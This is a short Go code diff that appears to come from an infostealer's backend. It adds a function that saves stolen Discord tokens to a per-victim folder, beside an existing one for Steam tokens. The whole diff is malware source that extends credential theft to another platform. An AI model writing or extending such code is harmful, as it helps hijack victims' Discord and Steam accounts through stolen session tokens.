@@ -75,6 +75,14 @@ func SaveSteamTokens(victimID string, tokens string) error {
 	return os.WriteFile(filepath.Join(dir, "SteamTokens.txt"), []byte(tokens), 0o644)
 }
 
+func SaveDiscordTokens(victimID string, tokens string) error {
+	dir := filepath.Join(DataDir(victimID), "Clients")
+	if err := os.MkdirAll(dir, 0o755); err != nil {
+		return err
+	}
+	return os.WriteFile(filepath.Join(dir, "DiscordTokens.txt"), []byte(tokens), 0o644)
+}
+
 func base64Decode(s string) ([]byte, error) {
 	return base64.StdEncoding.DecodeString(s)
 }
